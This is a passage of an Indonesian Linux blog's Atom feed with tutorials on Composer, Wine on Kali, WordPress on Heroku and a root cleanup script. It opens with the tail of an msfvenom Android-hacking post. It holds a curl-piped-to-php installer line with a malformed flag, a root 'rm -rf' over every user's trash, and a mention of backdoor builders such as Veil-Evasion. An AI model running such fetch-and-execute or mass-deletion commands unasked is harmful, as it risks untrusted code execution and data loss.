+&lt;p&gt;Tip sehat untuk mengamankan perangkat Android kamu adalah dengan &lt;b&gt;tidak menginstal aplikasi apa pun dari sumber yang tidak dikenal&lt;/b&gt;, bahkan jika Anda benar-benar ingin menginstalnya, cobalah untuk membaca dan memeriksa kode sumbernya untuk mengetahui apakah file ini berbahaya atau tidak.&lt;/p&gt;
+
+&lt;p&gt;&lt;small&gt;Artikel ini awalnya diterbitkan di &lt;a href=&quot;https://www.ehacking.net/2020/04/how-to-hack-an-android-phone-using-metasploit-msfvenom-in-kali-linux.html&quot;&gt;blog ehacking.&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;</content><author><name>x1666</name></author><category term="Linux" /><summary type="html">Kita akan menggunakan msfvenom untuk membuat payload dan</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lh3.googleusercontent.com/-rxGLOCRjIps/YYiUiLESssI/AAAAAAAAHec/faFJ7Uhm8_8Npi45FrYeYZvcin7miaXEwCLcBGAsYHQ/hack-android.webp" /><media:content medium="image" url="https://lh3.googleusercontent.com/-rxGLOCRjIps/YYiUiLESssI/AAAAAAAAHec/faFJ7Uhm8_8Npi45FrYeYZvcin7miaXEwCLcBGAsYHQ/hack-android.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Install Composer di Linux Mint</title><link href="http://localhost:4000/cara-install-composer-di-linux-mint-dan-ubuntu" rel="alternate" type="text/html" title="Install Composer di Linux Mint" /><published>2021-10-11T00:00:00+07:00</published><updated>2021-10-11T00:00:00+07:00</updated><id>http://localhost:4000/cara-install-composer-di-linux-mint-dan-ubuntu</id><content type="html" xml:base="http://localhost:4000/cara-install-composer-di-linux-mint-dan-ubuntu">&lt;p&gt;Composer merupakan sebuah aplikasi package manager PHP&lt;!--more--&gt; yang menyediakan format standar untuk mengelola dependensi dan juga library-library PHP yang diperlukan.&lt;/p&gt;
+
+&lt;p&gt;Dengan &lt;b&gt;Composer&lt;/b&gt; ini, kita bisa dengan mudah melakukan download maupun update dependensi ataupun library PHP yang kita inginkan.&lt;/p&gt;
+
+&lt;h1 id=&quot;cara-installasi-composer-pada-linux-mint-atau-ubuntu&quot;&gt;Cara Installasi Composer pada Linux Mint atau Ubuntu&lt;/h1&gt;
+&lt;p&gt;Kita langsung saja pada inti postingan kali ini. Bagi kamu yang ingin menginstall Composer pada linux-nya, silahkan ikuti langkah-langkah di bawah ini :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Update Sistem
+Pertama-tama silahkan kamu update terlebih dahulu sistem linux nya dengan menggunakan perintah :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;sudo apt-get update&lt;/pre&gt;
+&lt;p&gt;ketikkan perintah di atas pada terminal kemudian tekan enter dan tunggu sampai proses update selesai&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Install Dependesi yang diperlukan
+Setelah selesai melakukan update, langkah selanjutnya silahkan kamu ketikkan perintah di bawah ini pada terminal linux untuk menginstall beberapa dependensi yang diperlukan oleh composer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;sudo apt-get install curl php-cli php-mbstring git unzip&lt;/pre&gt;
+&lt;p&gt;kemudian tekan enter dan tunggu sampai proses installasi selesai&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Download dan Install Composer&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Setelah semua dependensi yang diperlukan sudah terinstall, selanjutnya kita download dan install composer dengan perintah di bawah ini :&lt;/p&gt;
+&lt;pre&gt;curl –sS https://getcomposer.org/installer | php&lt;/pre&gt;
+&lt;p&gt;tunggu sampai proses selesai. Jika sudah sekarang kita tinggal memindahkan composer.phar ke dalam folder /usr/local/bin/composer dengan menggunakan perintah di bawah ini :&lt;/p&gt;
+&lt;pre&gt;sudo mv composer.phar /usr/local/bin/composer&lt;/pre&gt;
+&lt;p&gt;Setelah semua proses di atas sobat lakukan dan tidak terjadi error, langkah selanjutnya silahkan sobat tes apakah Composer berhasil terinstall pada linux sobat dengan mengetikkan perintah berikut :&lt;/p&gt;
+&lt;pre&gt;composer&lt;/pre&gt;
+&lt;p&gt;Kemudian langsung tekan enter. Jika muncul tampilan seperti pada gambar di bawah ini, berarti composer sudah berhasil terinstall.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/composer.webp&quot; alt=&quot;composer&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Baiklah saya rasa cukup sekian tutorial yang bisa saya bagikan kali ini, semoga dengan adanya tutorial  ini bisa membantu kamu semua yang mengalami kesulitan installasi composer pada linux-nya.&lt;/p&gt;</content><author><name>x1666</name></author><category term="Linux" /><summary type="html">Composer merupakan sebuah aplikasi package manager PHP</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lh3.googleusercontent.com/-sT7H6PxhMPI/YYiVHi43jAI/AAAAAAAAHek/OHZWVq9wJZAhtQ0FwmPBBQU0MlBCNhUqgCLcBGAsYHQ/composer-install.webp" /><media:content medium="image" url="https://lh3.googleusercontent.com/-sT7H6PxhMPI/YYiVHi43jAI/AAAAAAAAHek/OHZWVq9wJZAhtQ0FwmPBBQU0MlBCNhUqgCLcBGAsYHQ/composer-install.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Cara Install Wine di Kali Linux</title><link href="http://localhost:4000/Cara-Mudah-Install-Wine-di-Kali-Linux" rel="alternate" type="text/html" title="Cara Install Wine di Kali Linux" /><published>2021-10-09T00:00:00+07:00</published><updated>2021-10-09T00:00:00+07:00</updated><id>http://localhost:4000/Cara-Mudah-Install-Wine-di-Kali-Linux</id><content type="html" xml:base="http://localhost:4000/Cara-Mudah-Install-Wine-di-Kali-Linux">&lt;p&gt;Banyak komentar “pake linux kok masih pengen pake aplikasi windows” dan&lt;!--more--&gt; komentar-komentar sejenis. Hmm.. saya sendiri gak tau apa tujuan kamu mau install Wine, tapi yang jelas gak semua yang install Wine itu bertujuan biar bisa ngejalanin aplikasi Windows di Linux.&lt;/p&gt;
+
+&lt;p&gt;Saya sendiri jujur masih butuh Wine karena tools pembuat backdoor seperti Veil-Evasion dll membutuhkan wine dan wine32 untuk membuat backdoor yang bisa dijalankan di Windows.&lt;/p&gt;
+
+&lt;p&gt;Pertama, jalankan perintah&lt;/p&gt;
+&lt;pre&gt;
+sudo apt-get install wine
+&lt;/pre&gt;
+
+&lt;p&gt;Sampai disini wine sudah terinstall. Namun masih ada dependensi yang kurang yaitu wine32.&lt;/p&gt;
+
+&lt;p&gt;install wine32 nya sebagai berikut:&lt;/p&gt;
+
+&lt;pre&gt;sudo dpkg --add-architecture i386 &amp;amp;&amp;amp; sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install wine32&lt;/pre&gt;
+
+&lt;p&gt;Lalu tunggu sampai proses install selesai. Lama tidaknya proses instalasi tergantung dari koneksi kalian.&lt;/p&gt;
+
+&lt;p&gt;Untuk menjalankan wine cukup ketik command&lt;/p&gt;
+
+&lt;pre&gt;wine&lt;/pre&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wine.webp&quot; alt=&quot;wine&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kemudian setting Wine dengan Perintah&lt;/p&gt;
+&lt;pre&gt;winecfg&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/images/setwine.webp&quot; alt=&quot;wine&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mari kita coba instal menjalankan aplikasi Windows Notepad ++ menggunakan Wine di Kali Linux.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/notepad-plus-plus/notepad-plus-plus/releases/&quot;&gt;Download Notepad ++&lt;/a&gt; dan simpan di disk local kamu.
+lalu ketikan perintah&lt;/p&gt;
+&lt;pre&gt;cd ~/Downloads&lt;br /&gt;
+wget https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.1.9/npp.8.1.9.Installer.exe&lt;/pre&gt;
+&lt;p&gt;Kemudian jalankan aplikasi penginstal, sesuaikan saja nama paketnya.&lt;/p&gt;
+&lt;pre&gt;$ wine ./npp.8.1.9.Installer.exe&lt;/pre&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/intallwine.webp&quot; alt=&quot;&quot; /&gt;
+Klik &lt;b&gt;OK&lt;/b&gt;, kemudian lanjutkan penginstallan tampilan akan sama seperti di windows.
+&lt;img src=&quot;/images/notpad.webp&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt; 
+&lt;img src=&quot;/images/notpadd.webp&quot; alt=&quot;&quot; /&gt;
+Tunggu hingga selesai…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/notepad++.webp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dan selesai. Mudah bukan..&lt;/p&gt;</content><author><name>x1666</name></author><category term="Linux" /><summary type="html">Banyak komentar “pake linux kok masih pengen pake aplikasi windows” dan</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://droidtechknow.com/how-to/how-to-install-and-use-wine-to-run-windows-applications-on-linux/images/how-to-install-and-use-wine-to-run-windows-applications-on-linux.jpg" /><media:content medium="image" url="https://droidtechknow.com/how-to/how-to-install-and-use-wine-to-run-windows-applications-on-linux/images/how-to-install-and-use-wine-to-run-windows-applications-on-linux.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Install Wordpress Di Heroku</title><link href="http://localhost:4000/cara-install-wordpress-di-heroku" rel="alternate" type="text/html" title="Install Wordpress Di Heroku" /><published>2021-09-11T00:00:00+07:00</published><updated>2021-09-11T00:00:00+07:00</updated><id>http://localhost:4000/cara-install-wordpress-di-heroku</id><content type="html" xml:base="http://localhost:4000/cara-install-wordpress-di-heroku">&lt;p&gt;Memindahkan semua situs web Wordpress yang saya hosting ke Heroku&lt;!--more--&gt; dan sekarang saya menghabiskan $0 sebulan, dengan senang hati menghemat lebih dari $300 setahun untuk biaya hosting dan Sertifikat SSL! Saya telah menyusun panduan ini untuk siapa saja yang mengelola situs Wordpress yang dihosting sendiri dan tidak memngeluarkan uang sepeser pun (selain dari biaya domain tahunan).&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Penafian:&lt;/b&gt; kamu akan terbatas pada database 5MB, yang lebih dari cukup untuk kebanyakan orang, kecuali kamu berencana untuk memiliki lebih dari 1.000 posting dan/atau plugin yang menghasilkan baris baru kapan pun kamu menerbitkan posting baru (tidak umum). Bagi siapa saja yang mungkin tidak mengetahui hal ini: gambar, kode, dll. tidak disimpan dalam database, mereka hanya direferensikan. Saya akan membagikan alat yang harus kamu gunakan untuk mengelola ukuran basis data kamu nanti dalam panduan ini. kamu juga tidak akan dapat memperbarui versi Wordpress atau menambahkan plugin/tema baru dari Dasbor Admin WP. kamu harus memperbarui nomor versi Wordpress di file Composer.json kami, dan secara manual menambahkan tema/plugin ke dalam repo Wordpress lokal kami sebelum push ke heroku. Ini mungkin terdengar memakan waktu, tetapi hanya membutuhkan tambahan 1-2 menit setiap kali kamu perlu membuat versi Wordpress, tema, atau pembaruan plugin.&lt;/p&gt;
+
+&lt;h1 id=&quot;langkah&quot;&gt;Langkah&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Daftar akun &lt;a href=&quot;https://shortlink.biz/205334&quot;&gt;Heroku&lt;/a&gt; untuk situs kamu masing-masing. Pilih “PHP” untuk bahasa pengembangan utama. Menambahkan informasi kartu kredit diperlukan bagi kita untuk menginstal Wordpress. Ini juga akan meningkatkan paket gratis kita dengan meningkatkan 500 jam dyno gratis kita menjadi 1000. Jika kamu ingin mempelajari lebih lanjut tentang jam kerja dyno, saya sangat merekomendasikan membaca posting blog Andrey Azimov . Instalasi Wordpress saya tidak akan selesai tanpa menambahkan CC. Saya tidak pernah ditagih dan situs saya sangat aktif. kamu dapat memeriksa penggunaan kamu di sini . Coba juga untuk membuat akun heroku terpisah untuk setiap situs web, kecuali jika kamu tidak mengharapkan banyak lalu lintas.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Klik tombol &lt;a href=&quot;https://shortlink.biz/205335&quot;&gt;Deploy to Heroku&lt;/a&gt; di repositories &lt;a href=&quot;https://shortlink.biz/205337&quot;&gt;ini&lt;/a&gt;. Saya telah menguji beberapa instalasi Heroku atau Wordpress yang berbeda dan sejauh ini yang terbaik.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Kunjungi aplikasi baru kamu dari &lt;a href=&quot;https://dashboard.heroku.com/apps/&quot;&gt;dasbor&lt;/a&gt; heroku kamu dan buka pengaturannya. Kloning URL Heroku git ke komputer kamu.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Klon &lt;a href=&quot;https://shortlink.biz/205338&quot;&gt;wordpress-heroku&lt;/a&gt; ke komputer kamu. Setelah itu, pindahkan konten wordpress-heroku ke dalam repo aplikasi kosong kamu. CD ke dalam aplikasi kamu, git add, commit, dan push. kamu sekarang dapat menghapus folder wordpress-heroku yang kosong dari komputer kamu.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Daftarkan akun Cloudflare. Cloudflare akan memberikan instruksi yang sesuai untuk memperbarui server nama kamu. yaitu Masuk ke GoDaddy, edit pengaturan DNS, perbarui server nama.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Contoh server nama:&lt;br /&gt;
+NS aldo.ns.cloudflare.com&lt;br /&gt;
+NS josephine.ns.cloudflare.com&lt;/p&gt;
+&lt;p /&gt;
+&lt;p&gt;&lt;br /&gt;
+kamu sekarang dapat memeriksa cloudflare untuk melihat apakah server nama kamu mengarah ke Cloudflare. Saya sarankan menunggu setidaknya 5-10 menit untuk memperbaruinya.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Langkah ini opsional tetapi sangat dianjurkan. Klik tab “Aturan Halaman” di Cloudflare dan masukkan tiga aturan halaman berikut:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;em&gt;YOURDOMAIN.com/&lt;/em&gt;
+Selalu Gunakan HTTPS&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;www.YOURDOMAIN.com/*
+URL Penerusan - 301 Pengalihan Permanen
+https://YOURDOMAIN.com/$1&lt;/li&gt;
+  &lt;li&gt;DOMAIN kamu.com/*
+• Perkecil otomatis Html, Css, Js
+• Pemuat Roket Aktif
+• TTL Tembolok Peramban - 1 bulan&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Buka tab baru dan kunjungi pengaturan aplikasi heroku kamu lagi. Klik “Tambah Domain” dan masukkan nama domain kamu tanpa “www” atau “https”. Salin target DNS. Buka dasbor Cloudflare kamu dan klik tab DNS. Kita hanya membutuhkan dua baris berikut. kamu dapat menghapus baris lain jika kamu mau.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://res.cloudinary.com/practicaldev/image/fetch/s--iZ6PSbu6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/r54ezmx6pp6hipoovhqg.png&quot; alt=&quot;DNS&quot; /&gt;
+&lt;b&gt;Catatan:&lt;/b&gt; Target DNS kamu kemungkinan besar akan berbeda dari yang disediakan di tangkapan layar.
+&lt;b&gt;Selamat kamu sekarang dapat mengunjungi situs Wordpress baru kamu!&lt;/b&gt;
+&lt;br /&gt;Contoh Wordpress Heroku &lt;a href=&quot;https://shortlink.biz/205340&quot;&gt;daffadev.herokuapp.com&lt;/a&gt;&lt;br /&gt;Contoh WooCommerce di Wordpress Heroku &lt;a href=&quot;https://shortlink.biz/205352&quot;&gt;as-syariahbordir.herokuapp.com&lt;/a&gt;&lt;/p&gt;</content><author><name>x1666</name></author><category term="WebSite" /><summary type="html">Memindahkan semua situs web Wordpress yang saya hosting ke Heroku</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://docs.google.com/uc?export=download&amp;id=1Te1cuAm7rwoAfiHWSMTJYpJnCiA_H3LQ" /><media:content medium="image" url="https://docs.google.com/uc?export=download&amp;id=1Te1cuAm7rwoAfiHWSMTJYpJnCiA_H3LQ" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Membersihkan Sistem Linux</title><link href="http://localhost:4000/Membersihkan-Sistem-Linux-Mint-Dengan-Script" rel="alternate" type="text/html" title="Membersihkan Sistem Linux" /><published>2021-02-18T00:00:00+07:00</published><updated>2021-02-18T00:00:00+07:00</updated><id>http://localhost:4000/Membersihkan-Sistem-Linux-Mint-Dengan-Script</id><content type="html" xml:base="http://localhost:4000/Membersihkan-Sistem-Linux-Mint-Dengan-Script">&lt;p&gt;Merasa sistem linux kamu terasa lebih berat? Kernel yang bertumpuk&lt;!--more--&gt; setelah kamu meng-upgrade kernel beberapa kali saat bootloader berjalan seperti gambar di samping? Atau free space pada sistem kamu terasa lebih kecil dari seharusnya? Itu bertkamu bahwa sistem kamu masih menyimpan “sampah”. Segera bersihkan sistem kamu! Bagaimana caranya?&lt;/p&gt;
+
+&lt;p&gt;Sebenarnya apa sih maksudnya file sampah? Maksudnya adalah file-file yang tidak digunakan dalam sistem. Beberapa aplikasi akan menyimpan data tambahan untuk digunakan kemudian atau sebagai backup. Namun jika kamu sudah merasa nyaman dengan yang ada, atau tidak menggunakannya lagi, file-file tersebut akan terus menumpuk dan memakan memory kamu atau bahkan bisa mengurangi efisiensi sistem kamu. Jika kamu seorang geek yang suka meng-install dan meng-uninstall aplikasi akan lebih banyak file sampah yang dihasilkan. Sehingga melakukan pembersihan (Cleaning) diperlukan untuk menjaga sistem kamu lebih optimal dan memperbesar free space dalam hardisk kamu.&lt;/p&gt;
+
+&lt;p&gt;File-file sampah tersebut dapat berupa :&lt;/p&gt;
+
+&lt;p&gt;-Cache dan history dari aplikasi
+-File Temporary
+-File backup
+-File dalam Trash
+-Paket orphans (tidak digunakan)
+-Konfigurasi tak terpakai
+-Kernel lama
+Banyak pengguna linux yang merekomendasikan Bleachbit sebagai cleaning tools dalam sistem linux. Namun sayangnya Bleachbit tidak dapat menghapus paket orphans, konfigurasi tak terpakai, dan kernel lama. Terutama untuk kernel lama, bukan hanya memperbesar penggunaan hardisk saja. Kernel lama yang sudah tidak pernah kamu gunakan dapat bertumpuk pada bootloader. Ini tentu membuat bootloader terlihat kurang rapi.&lt;/p&gt;
+
+&lt;p&gt;Untuk konfigurasi tak terpakai bisa kamu hapus melalui perintah apt. Tapi apa kamu tahu file tersebut apa saja? Berapa banyak kernel yang kamu simpan? Mau ketik nama konfigurasi dan kernel satu persatu?&lt;/p&gt;
+
+&lt;p&gt;Nah! Di sini saya memberikan script sederhana untuk mengatasi masalah tersebut. Script ini berasal dari sini dan dapat menghapus cache dari apt, konfigurasi lama, dan kernel lama. Berikut script tersebut :&lt;/p&gt;
+
+&lt;pre&gt;
+
+#!/bin/bash
+
+
+OLDCONF=$(dpkg -l|grep &quot;^rc&quot;|awk '{print $2}')
+
+CURKERNEL=$(uname -r|sed 's/-*[a-z]//g'|sed 's/-386//g')
+
+LINUXPKG=&quot;linux-(image|headers|ubuntu-modules|restricted-modules)&quot;
+
+METALINUXPKG=&quot;linux-(image|headers|restricted-modules)-(generic|i386|server|common|rt|xen)&quot;
+
+OLDKERNELS=$(dpkg -l|awk '{print $2}'|grep -E $LINUXPKG |grep -vE $METALINUXPKG|grep -v $CURKERNEL)
+
+YELLOW=&quot;\033[1;33m&quot;
+
+RED=&quot;\033[0;31m&quot;
+
+ENDCOLOR=&quot;\033[0m&quot;
+
+
+if [ $USER != root ]; then
+
+echo -e $RED&quot;Error: must be root&quot;
+
+echo -e $YELLOW&quot;Exiting...&quot;$ENDCOLOR
+
+exit 0
+
+fi
+
+
+echo -e $YELLOW&quot;Cleaning apt cache...&quot;$ENDCOLOR
+
+aptitude clean
+
+
+echo -e $YELLOW&quot;Removing old config files...&quot;$ENDCOLOR
+
+sudo aptitude purge $OLDCONF
+
+
+echo -e $YELLOW&quot;Removing old kernels...&quot;$ENDCOLOR
+
+sudo aptitude purge $OLDKERNELS
+
+
+echo -e $YELLOW&quot;Emptying every trashes...&quot;$ENDCOLOR
+
+rm -rf /home/*/.local/share/Trash/*/** &amp;amp;&amp;gt; /dev/null
+
+rm -rf /root/.local/share/Trash/*/** &amp;amp;&amp;gt; /dev/null
+
+
+echo -e $YELLOW&quot;Script Finished!&quot;$ENDCOLOR
+
+&lt;/pre&gt;
+
+&lt;p&gt;Nah! untuk menggunakannya copy-paste script ini melalui text editor kesayangan kamu semisal Gedit, lalu simpan ke dalam home folder kamu dengan nama mintcleaner.sh (Sebenarnya nama bisa sesuka kamu, asalkan extensinya tetap .sh).&lt;/p&gt;
+
+&lt;p&gt;Lalu buka terminal, dan jalankan perintah&lt;/p&gt;
+
+&lt;pre&gt;sudo chmod +x mintcleaner.sh&lt;/pre&gt;
+
+&lt;p&gt;Sekarang script sudah siap kamu pakai! Untuk menjalankan script tersebut gunakan perintah&lt;/p&gt;
+
+&lt;pre&gt;sudo sh mintcleaner.sh&lt;/pre&gt;
+
+&lt;p&gt;Menurutku, script ini juga bisa digunakan untuk distro Ubuntu dan derivatifnya.&lt;/p&gt;</content><author><name>x1666</name></author><category term="Linux" /><summary type="html">Merasa sistem linux kamu terasa lebih berat? Kernel yang bertumpuk</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://drive.google.com/uc?export=download&amp;id=1_zML02ckENm6l9lOWPz1uF0M3Astg0ou" /><media:content medium="image" url="https://drive.google.com/uc?export=download&amp;id=1_zML02ckENm6l9lOWPz1uF0M3Astg0ou" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
